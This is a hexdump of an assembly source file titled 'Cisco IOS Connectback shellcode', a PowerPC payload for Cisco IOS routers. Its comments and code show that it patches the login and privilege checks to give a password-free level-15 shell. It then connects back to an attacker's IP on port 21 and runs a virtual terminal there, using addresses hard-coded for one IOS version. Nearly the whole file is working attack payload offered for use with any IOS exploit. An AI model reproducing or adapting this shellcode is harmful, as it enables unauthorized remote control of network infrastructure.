00000000  23 20 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |# --------------|
00000010  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000050  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 0d 0a 23 0d 0a 23  |----------..#..#|
00000060  20 43 69 73 63 6f 20 49  4f 53 20 43 6f 6e 6e 65  | Cisco IOS Conne|
00000070  63 74 62 61 63 6b 20 73  68 65 6c 6c 63 6f 64 65  |ctback shellcode|
00000080  20 76 31 2e 30 0d 0a 23  20 28 63 29 20 32 30 30  | v1.0..# (c) 200|
00000090  37 20 49 52 4d 20 50 6c  63 0d 0a 23 20 42 79 20  |7 IRM Plc..# By |
000000a0  47 79 61 6e 20 43 68 61  77 64 68 61 72 79 0d 0a  |Gyan Chawdhary..|
000000b0  23 0d 0a 23 20 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |#..# -----------|
000000c0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000100  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0d 0a 23  |-------------..#|
00000110  0d 0a 23 20 54 68 65 20  63 6f 64 65 20 63 72 65  |..# The code cre|
00000120  61 74 65 73 20 61 20 6e  65 77 20 54 54 59 2c 20  |ates a new TTY, |
00000130  61 6c 6c 6f 63 61 74 65  73 20 61 20 73 68 65 6c  |allocates a shel|
00000140  6c 20 77 69 74 68 20 70  72 69 76 69 6c 65 67 65  |l with privilege|
00000150  20 6c 65 76 65 6c 20 31  35 20 61 6e 64 20 63 6f  | level 15 and co|
00000160  6e 6e 65 63 74 73 20 62  61 63 6b 20 0d 0a 23 20  |nnects back ..# |
00000170  6f 6e 20 70 6f 72 74 20  32 31 0d 0a 23 0d 0a 23  |on port 21..#..#|
00000180  20 54 68 69 73 20 73 68  65 6c 6c 63 6f 64 65 20  | This shellcode |
00000190  63 61 6e 20 62 65 20 75  73 65 64 20 61 73 20 74  |can be used as t|
000001a0  68 65 20 70 61 79 6c 6f  61 64 20 66 6f 72 20 61  |he payload for a|
000001b0  6e 79 20 49 4f 53 20 65  78 70 6c 6f 69 74 20 6f  |ny IOS exploit o|
000001c0  6e 20 61 20 50 6f 77 65  72 50 43 2d 62 61 73 65  |n a PowerPC-base|
000001d0  64 20 64 65 76 69 63 65  2e 0d 0a 23 20 0d 0a 23  |d device...# ..#|
000001e0  0d 0a 23 20 54 68 65 20  66 6f 6c 6c 6f 77 69 6e  |..# The followin|
000001f0  67 20 66 69 76 65 20 68  61 72 64 2d 63 6f 64 65  |g five hard-code|
00000200  64 20 61 64 64 72 65 73  73 65 73 20 6d 75 73 74  |d addresses must|
00000210  20 62 65 20 6c 6f 63 61  74 65 64 20 66 6f 72 20  | be located for |
00000220  74 68 65 20 74 61 72 67  65 74 20 49 4f 53 20 76  |the target IOS v|
00000230  65 72 73 69 6f 6e 2e 20  0d 0a 23 0d 0a 23 20 54  |ersion. ..#..# T|
00000240  68 65 20 68 61 72 64 2d  63 6f 64 65 64 20 61 64  |he hard-coded ad|
00000250  64 72 65 73 73 65 73 20  75 73 65 64 20 68 65 72  |dresses used her|
00000260  65 20 61 72 65 20 66 6f  72 3a 0d 0a 23 0d 0a 23  |e are for:..#..#|
00000270  20 49 4f 53 20 28 74 6d  29 20 43 32 36 30 30 20  | IOS (tm) C2600 |
00000280  53 6f 66 74 77 61 72 65  20 28 43 32 36 30 30 2d  |Software (C2600-|
00000290  49 4b 39 53 2d 4d 29 2c  20 56 65 72 73 69 6f 6e  |IK9S-M), Version|
000002a0  20 31 32 2e 33 28 32 32  29 2c 20 52 45 4c 45 41  | 12.3(22), RELEA|
000002b0  53 45 20 53 4f 46 54 57  41 52 45 20 28 66 63 32  |SE SOFTWARE (fc2|
000002c0  29 0d 0a 23 0d 0a 23 20  2d 2d 2d 2d 2d 2d 2d 2d  |)..#..# --------|
000002d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000320  0d 0a 2e 65 71 75 20 6d  61 6c 6c 6f 63 2c 20 30  |...equ malloc, 0|
00000330  78 38 30 34 37 38 35 43  43 0d 0a 2e 65 71 75 20  |x804785CC...equ |
00000340  61 6c 6c 6f 63 61 74 65  5f 74 74 79 2c 20 30 78  |allocate_tty, 0x|
00000350  38 30 33 64 31 35 35 63  0d 0a 2e 65 71 75 20 72  |803d155c...equ r|
00000360  65 74 2c 20 30 78 38 30  34 61 34 32 65 38 0d 0a  |et, 0x804a42e8..|
00000370  2e 65 71 75 20 61 64 64  72 2c 20 30 78 38 30 33  |.equ addr, 0x803|
00000380  63 34 61 64 38 20 0d 0a  2e 65 71 75 20 73 74 72  |c4ad8 ...equ str|
00000390  2c 20 30 78 38 31 65 32  37 30 62 34 0d 0a 2e 65  |, 0x81e270b4...e|
000003a0  71 75 20 74 63 70 5f 63  6f 6e 6e 65 63 74 2c 20  |qu tcp_connect, |
000003b0  30 78 38 30 35 36 37 35  36 38 0d 0a 2e 65 71 75  |0x80567568...equ|
000003c0  20 74 63 70 5f 65 78 65  63 75 74 65 5f 63 6f 6d  | tcp_execute_com|
000003d0  6d 61 6e 64 2c 20 30 78  38 30 35 36 63 33 35 34  |mand, 0x8056c354|
000003e0  0d 0a 2e 65 71 75 20 6c  6f 67 69 6e 2c 20 30 78  |...equ login, 0x|
000003f0  38 33 35 39 62 31 66 34  0d 0a 2e 65 71 75 20 67  |8359b1f4...equ g|
00000400  6f 64 2c 20 30 78 66 66  31 30 30 30 30 30 0d 0a  |od, 0xff100000..|
00000410  2e 65 71 75 20 70 72 69  76 2c 20 30 78 38 33 35  |.equ priv, 0x835|
00000420  39 62 65 36 34 0d 0a 23  20 2d 2d 2d 2d 2d 2d 2d  |9be64..# -------|
00000430  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000480  2d 0d 0a 0d 0a 6d 61 69  6e 3a 0d 0a 09 73 74 77  |-....main:...stw|
00000490  75 20 31 2c 2d 34 38 28  31 29 0d 0a 09 6d 66 6c  |u 1,-48(1)...mfl|
000004a0  72 20 30 0d 0a 09 73 74  77 20 33 31 2c 34 34 28  |r 0...stw 31,44(|
000004b0  31 29 0d 0a 09 73 74 77  20 30 2c 35 32 28 31 29  |1)...stw 0,52(1)|
000004c0  0d 0a 09 6d 72 20 33 31  2c 31 0d 0a 09 6c 69 20  |...mr 31,1...li |
000004d0  33 2c 35 31 32 0d 0a 09  6c 69 73 20 39 2c 6d 61  |3,512...lis 9,ma|
000004e0  6c 6c 6f 63 40 68 61 20  20 23 6d 61 6c 6c 6f 63  |lloc@ha  #malloc|
000004f0  28 29 20 6d 65 6d 6f 72  79 20 66 6f 72 20 74 63  |() memory for tc|
00000500  70 20 73 74 72 75 63 74  75 72 65 0d 0a 09 6c 61  |p structure...la|
00000510  20 39 2c 6d 61 6c 6c 6f  63 40 6c 28 39 29 0d 0a  | 9,malloc@l(9)..|
00000520  09 6d 74 63 74 72 20 39  0d 0a 09 62 63 74 72 6c  |.mtctr 9...bctrl|
00000530  0d 0a 09 6d 72 20 30 2c  33 0d 0a 09 73 74 77 20  |...mr 0,3...stw |
00000540  30 2c 32 30 28 33 31 29  0d 0a 09 6c 77 7a 20 39  |0,20(31)...lwz 9|
00000550  2c 31 32 28 33 31 29 0d  0a 09 6c 69 20 30 2c 31  |,12(31)...li 0,1|
00000560  0d 0a 09 73 74 62 20 30  2c 30 28 39 29 0d 0a 09  |...stb 0,0(9)...|
00000570  6c 77 7a 20 39 2c 31 32  28 33 31 29 0d 0a 09 6c  |lwz 9,12(31)...l|
00000580  69 73 20 30 2c 30 78 61  63 31 65 20 23 20 20 63  |is 0,0xac1e #  c|
00000590  6f 6e 6e 65 63 74 20 62  61 63 6b 20 69 70 20 61  |onnect back ip a|
000005a0  64 64 72 65 73 73 20 0d  0a 09 6f 72 69 20 30 2c  |ddress ...ori 0,|
000005b0  30 2c 31 30 31 38 20 23  0d 0a 09 73 74 77 20 30  |0,1018 #...stw 0|
000005c0  2c 34 28 39 29 0d 0a 09  6c 69 20 33 2c 36 36 0d  |,4(9)...li 3,66.|
000005d0  0a 09 6c 69 20 34 2c 30  0d 0a 09 6c 69 73 20 39  |..li 4,0...lis 9|
000005e0  2c 61 6c 6c 6f 63 61 74  65 5f 74 74 79 40 68 61  |,allocate_tty@ha|
000005f0  20 20 23 20 61 6c 6c 6f  63 61 74 65 20 6e 65 77  |  # allocate new|
00000600  20 54 54 59 0d 0a 09 6c  61 20 39 2c 61 6c 6c 6f  | TTY...la 9,allo|
00000610  63 61 74 65 5f 74 74 79  40 6c 28 39 29 0d 0a 09  |cate_tty@l(9)...|
00000620  6d 74 63 74 72 20 39 0d  0a 09 62 63 74 72 6c 0d  |mtctr 9...bctrl.|
00000630  0a 09 61 64 64 69 20 30  2c 33 31 2c 32 34 0d 0a  |..addi 0,31,24..|
00000640  0d 0a 09 23 20 46 69 78  20 54 54 59 20 73 74 72  |...# Fix TTY str|
00000650  75 63 74 75 72 65 20 74  6f 20 65 6e 61 62 6c 65  |ucture to enable|
00000660  20 6c 65 76 65 6c 20 31  35 20 73 68 65 6c 6c 20  | level 15 shell |
00000670  77 69 74 68 6f 75 74 20  70 61 73 73 77 6f 72 64  |without password|
00000680  0d 0a 09 23 20 0d 0a 09  23 0d 0a 09 23 23 23 23  |...# ...#...####|
00000690  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
000006c0  23 23 23 23 23 23 0d 0a  0d 0a 09 23 20 6c 6f 67  |######.....# log|
000006d0  69 6e 20 70 61 74 63 68  20 62 65 67 69 6e 0d 0a  |in patch begin..|
000006e0  09 6c 69 73 20 39 2c 20  6c 6f 67 69 6e 40 68 61  |.lis 9, login@ha|
000006f0  0d 0a 09 6c 61 20 39 2c  20 6c 6f 67 69 6e 40 6c  |...la 9, login@l|
00000700  28 39 29 0d 0a 09 6c 69  20 38 2c 30 0d 0a 09 73  |(9)...li 8,0...s|
00000710  74 77 20 38 2c 20 30 28  39 29 0d 0a 09 23 20 6c  |tw 8, 0(9)...# l|
00000720  6f 67 69 6e 20 70 61 74  63 68 20 65 6e 64 0d 0a  |ogin patch end..|
00000730  0d 0a 09 23 49 44 41 20  70 6c 61 63 65 68 6f 6c  |...#IDA placehol|
00000740  64 65 72 20 66 6f 72 20  63 6f 6e 30 0d 0a 09 23  |der for con0...#|
00000750  0d 0a 09 23 20 6c 69 73  20 20 20 20 20 25 72 39  |...# lis     %r9|
00000760  2c 20 28 28 73 74 64 69  6f 2b 30 78 31 30 30 30  |, ((stdio+0x1000|
00000770  30 29 40 68 29 0d 0a 20  20 20 20 20 20 20 20 23  |0)@h)..        #|
00000780  20 6c 77 7a 20 20 20 20  20 25 72 39 2c 20 73 74  | lwz     %r9, st|
00000790  64 69 6f 40 6c 28 25 72  39 29 0d 0a 20 20 20 20  |dio@l(%r9)..    |
000007a0  20 20 20 20 23 20 6c 77  7a 20 20 20 20 20 25 72  |    # lwz     %r|
000007b0  30 2c 20 30 78 44 45 34  28 25 72 39 29 20 23 70  |0, 0xDE4(%r9) #p|
000007c0  72 69 76 20 73 74 72 75  63 74 0d 0a 20 20 20 20  |riv struct..    |
000007d0  20 20 20 20 23 0d 0a 09  23 20 70 72 69 76 20 70  |    #...# priv p|
000007e0  61 74 63 68 20 62 65 67  69 6e 0d 0a 09 6c 69 73  |atch begin...lis|
000007f0  20 39 2c 20 70 72 69 76  40 68 61 0d 0a 09 6c 61  | 9, priv@ha...la|
00000800  20 39 2c 20 70 72 69 76  40 6c 28 39 29 0d 0a 09  | 9, priv@l(9)...|
00000810  6c 69 73 20 38 2c 20 67  6f 64 40 68 61 0d 0a 09  |lis 8, god@ha...|
00000820  6c 61 20 38 2c 20 67 6f  64 40 6c 28 38 29 0d 0a  |la 8, god@l(8)..|
00000830  09 73 74 77 20 38 2c 20  30 28 39 29 0d 0a 09 23  |.stw 8, 0(9)...#|
00000840  20 70 72 69 76 20 70 61  74 63 68 20 65 6e 64 20  | priv patch end |
00000850  0d 0a 09 0d 0a 09 23 23  23 23 23 23 23 23 23 23  |......##########|
00000860  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000890  23 0d 0a 0d 0a 09 6c 69  20 33 2c 30 0d 0a 09 6c  |#.....li 3,0...l|
000008a0  69 20 34 2c 32 31 09 09  23 20 50 6f 72 74 20 32  |i 4,21..# Port 2|
000008b0  31 20 66 6f 72 20 63 6f  6e 6e 65 63 74 62 61 63  |1 for connectbac|
000008c0  6b 0d 0a 09 6c 77 7a 20  35 2c 31 32 28 33 31 29  |k...lwz 5,12(31)|
000008d0  0d 0a 09 6c 69 20 36 2c  30 0d 0a 09 6c 69 20 37  |...li 6,0...li 7|
000008e0  2c 30 0d 0a 09 6d 72 20  38 2c 30 0d 0a 09 6c 69  |,0...mr 8,0...li|
000008f0  20 39 2c 30 0d 0a 09 6c  69 73 20 31 31 2c 74 63  | 9,0...lis 11,tc|
00000900  70 5f 63 6f 6e 6e 65 63  74 40 68 61 20 09 23 20  |p_connect@ha .# |
00000910  43 6f 6e 6e 65 63 74 20  74 6f 20 61 74 74 61 63  |Connect to attac|
00000920  6b 65 72 20 49 50 0d 0a  09 6c 61 20 31 31 2c 74  |ker IP...la 11,t|
00000930  63 70 5f 63 6f 6e 6e 65  63 74 40 6c 28 31 31 29  |cp_connect@l(11)|
00000940  0d 0a 09 6d 74 63 74 72  20 31 31 0d 0a 09 62 63  |...mtctr 11...bc|
00000950  74 72 6c 0d 0a 09 6d 72  20 30 2c 33 0d 0a 09 73  |trl...mr 0,3...s|
00000960  74 77 20 30 2c 32 30 28  33 31 29 0d 0a 09 6c 69  |tw 0,20(31)...li|
00000970  20 33 2c 36 36 0d 0a 09  6c 77 7a 20 34 2c 32 30  | 3,66...lwz 4,20|
00000980  28 33 31 29 0d 0a 09 6c  69 20 35 2c 30 0d 0a 09  |(31)...li 5,0...|
00000990  6c 69 20 36 2c 30 0d 0a  09 6c 69 20 37 2c 30 0d  |li 6,0...li 7,0.|
000009a0  0a 09 6c 69 20 38 2c 30  0d 0a 09 6c 69 20 39 2c  |..li 8,0...li 9,|
000009b0  30 0d 0a 09 6c 69 20 31  30 2c 30 0d 0a 09 6c 69  |0...li 10,0...li|
000009c0  73 20 31 31 2c 74 63 70  5f 65 78 65 63 75 74 65  |s 11,tcp_execute|
000009d0  5f 63 6f 6d 6d 61 6e 64  40 68 61 20 20 20 23 20  |_command@ha   # |
000009e0  45 78 65 63 75 74 65 20  56 69 72 74 75 61 6c 20  |Execute Virtual |
000009f0  54 65 72 6d 69 6e 61 6c  20 6f 6e 20 6f 75 74 67  |Terminal on outg|
00000a00  6f 69 6e 67 20 63 6f 6e  6e 65 63 74 69 6f 6e 2c  |oing connection,|
00000a10  20 73 69 6d 69 6c 61 72  20 74 6f 20 2f 62 69 6e  | similar to /bin|
00000a20  2f 62 61 73 68 0d 0a 09  6c 61 20 31 31 2c 74 63  |/bash...la 11,tc|
00000a30  70 5f 65 78 65 63 75 74  65 5f 63 6f 6d 6d 61 6e  |p_execute_comman|
00000a40  64 40 6c 28 31 31 29 0d  0a 09 6d 74 63 74 72 20  |d@l(11)...mtctr |
00000a50  31 31 0d 0a 09 62 63 74  72 6c 0d 0a 09 6c 77 7a  |11...bctrl...lwz|
00000a60  20 31 31 2c 30 28 31 29  0d 0a 09 6c 77 7a 20 30  | 11,0(1)...lwz 0|
00000a70  2c 34 28 31 31 29 0d 0a  09 6d 74 6c 72 20 30 0d  |,4(11)...mtlr 0.|
00000a80  0a 09 6c 77 7a 20 33 31  2c 2d 34 28 31 31 29 0d  |..lwz 31,-4(11).|
00000a90  0a 09 6d 72 20 31 2c 31  31 0d 0a 0d 0a 09 23 23  |..mr 1,11.....##|
00000aa0  23 23 23 23 23 23 23 23  23 23 23 23 23 23 23 23  |################|
*
00000ac0  23 23 23 23 23 23 23 23  23 0d 0a 09 6c 69 73 20  |#########...lis |
00000ad0  20 20 20 20 39 2c 20 61  64 64 72 40 68 61 09 09  |    9, addr@ha..|
00000ae0  0d 0a 20 20 20 20 20 20  20 20 61 64 64 69 20 20  |..        addi  |
00000af0  20 20 30 2c 20 39 2c 20  61 64 64 72 40 6c 0d 0a  |  0, 9, addr@l..|
00000b00  20 20 20 20 20 20 20 20  6d 74 63 74 72 20 20 20  |        mtctr   |
00000b10  30 0d 0a 20 20 20 20 20  20 20 20 78 6f 72 20 33  |0..        xor 3|
00000b20  2c 33 2c 33 0d 0a 20 20  20 20 20 20 20 20 61 64  |,3,3..        ad|
00000b30  64 69 20 20 20 20 33 2c  30 2c 20 2d 32 0d 0a 20  |di    3,0, -2.. |
00000b40  20 20 20 20 20 20 20 6c  69 73 20 20 20 20 20 31  |       lis     1|
00000b50  30 2c 20 73 74 72 40 68  61 0d 0a 20 20 20 20 20  |0, str@ha..     |
00000b60  20 20 20 61 64 64 69 20  20 20 20 34 2c 20 31 30  |   addi    4, 10|
00000b70  2c 20 73 74 72 40 6c 0d  0a 20 20 20 20 20 20 20  |, str@l..       |
00000b80  20 62 63 74 72 6c 0d 0a  20 20 20 20 20 20 20 20  | bctrl..        |
00000b90  6c 69 73 20 20 20 20 20  31 30 2c 20 72 65 74 40  |lis     10, ret@|
00000ba0  68 61 0d 0a 20 20 20 20  20 20 20 20 61 64 64 69  |ha..        addi|
00000bb0  20 20 20 20 34 2c 20 31  30 2c 20 72 65 74 40 6c  |    4, 10, ret@l|
00000bc0  0d 0a 20 20 20 20 20 20  20 20 6d 74 63 74 72 20  |..        mtctr |
00000bd0  20 20 34 0d 0a 20 20 20  20 20 20 20 20 62 63 74  |  4..        bct|
00000be0  72 6c                                             |rl|
00000be2
